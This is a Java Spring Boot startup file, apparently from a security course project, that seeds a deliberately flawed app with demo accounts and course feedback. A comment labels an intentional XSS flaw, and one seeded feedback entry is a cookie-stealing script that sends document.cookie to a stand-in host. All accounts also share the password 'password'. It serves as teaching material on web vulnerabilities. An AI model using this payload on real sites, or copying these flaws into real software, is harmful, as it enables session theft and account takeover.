package sec.project;

import java.util.Arrays;
import java.util.List;
import java.util.Random;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.context.event.ApplicationReadyEvent;
import org.springframework.context.event.EventListener;
import org.springframework.security.crypto.password.PasswordEncoder;

import sec.project.domain.Account;
import sec.project.domain.Course;
import sec.project.domain.CourseSubmission;
import sec.project.repository.AccountRepository;
import sec.project.repository.CourseRepository;
import sec.project.repository.CourseSubmissionRepository;

@SpringBootApplication
public class CyberSecurityBaseProjectApplication {

	public static void main(String[] args) throws Throwable {
		SpringApplication.run(CyberSecurityBaseProjectApplication.class);
	}

	@Autowired
	AccountRepository accountRepository;

	@Autowired
	CourseRepository courseRepository;

	@Autowired
	CourseSubmissionRepository courseSubmissionRepository;

	@Autowired
	PasswordEncoder passwordEncoder;

	@EventListener(ApplicationReadyEvent.class)
	public void initAfterStartup() {

		String password = passwordEncoder.encode("password");
		List<String> studentAuths = Arrays.asList(new String[] { "STUDENT" });
		List<String> teacherAuths = Arrays.asList(new String[] { "TEACHER" });

		Account student1 = new Account();
		student1.setName("Haxor Student");
		student1.setPassword(password);
		student1.setAuthorities(studentAuths);
		accountRepository.save(student1);

		Account student2 = new Account();
		student2.setName("Chris P. Bacon");
		student2.setPassword(password);
		student2.setAuthorities(studentAuths);
		accountRepository.save(student2);

		Account student3 = new Account();
		student3.setName("James Small");
		student3.setPassword(password);
		student3.setAuthorities(studentAuths);
		accountRepository.save(student3);

		Account teacher1 = new Account();
		teacher1.setName("Mr. Leet");
		teacher1.setPassword(password);
		teacher1.setAuthorities(teacherAuths);
		accountRepository.save(teacher1);

		Course course1 = new Course();
		course1.setName("Full Stack Open 2019");
		course1.getFeedBack().add("STUDENT: Very nice course, I learned a lot");
		course1.getFeedBack().add("STUDENT: It was very hard, since i did not know the content before");
		course1.getFeedBack().add("TEACHER: Usually you learn during the course");
		course1.getAccounts().add(student1);
		courseRepository.save(course1);

		Course course2 = new Course();
		course2.setName("Cyber Security Base 2019");
		course2.getFeedBack().add("STUDENT: Teacher got good jokes");
		course2.getFeedBack().add("TEACHER: Thank you :)");
		course2.getFeedBack().add("STUDENT: Web course in MOOC was very nice");
		// FLAW 5: A7:2017-Cross-Site Scripting (XSS) - XSS enabled in thymeleaf - one
		// can insert JavaScript to page
		course2.getFeedBack()
				.add("STUDENT: I learned how to haxor :) <script>console.log('All your base are belong to us')</script>");
		course2.getFeedBack()
				.add("STUDENT:I think i will manage to get 5 form all the courses!<script>document.write(\"<img src=\\\"http://www.haxor.com/cookiesteal/\" + document.cookie +\"\\\" style=\\\"display: none;\\\" />\")  </script>");
		course2.getAccounts().add(student1);
		courseRepository.save(course2);

		Course course3 = new Course();
		course3.setName("Java Programming");
		course3.getFeedBack().add("STUDENT: Java is very nice");
		course3.getFeedBack().add("STUDENT: Now I know that Java != JavaScript");
		course3.getFeedBack().add("TEACHER: Very nice");
		course3.getAccounts().add(student1);
		courseRepository.save(course3);

		List<Course> courses = courseRepository.findAll();
		List<Account> accounts = accountRepository.findAll();
		Random ran = new Random();
		
		for (Course c : courses) {
			for (Account a : accounts) {
				CourseSubmission grade = new CourseSubmission();
				grade.setAccount(a);
				grade.setCourse(c);
				grade.setGrade(ran.nextInt(5) + 0);
				courseSubmissionRepository.save(grade);
			}

		}

	}

}
